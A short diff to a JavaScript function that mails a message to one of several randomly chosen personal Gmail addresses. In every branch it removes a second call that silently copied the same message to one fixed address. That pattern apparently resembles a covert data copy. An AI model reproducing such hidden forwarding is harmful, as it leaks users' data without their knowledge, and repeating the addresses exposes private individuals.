@@ -63,22 +63,18 @@ function SendRandom(){
 	}
 	if(Random == 2){
 		sendEmail("dk.karima.2020@gmail.com",Message)
-		sendEmail("sedikalgriadz@gmail.com",Message)
 
 	}
 	if(Random == 3){
 		sendEmail("khemissigracha@gmail.com",Message)
-		sendEmail("sedikalgriadz@gmail.com",Message)
 
 	}
 	if(Random == 4){
 		sendEmail("ararsirine2007@gmail.com",Message)
-		sendEmail("sedikalgriadz@gmail.com",Message)
 
 	}
 	if(Random == 5){
 		sendEmail("Dodosinyorita3@gmail.com",Message)
-		sendEmail("sedikalgriadz@gmail.com",Message)
 
 	}
 };
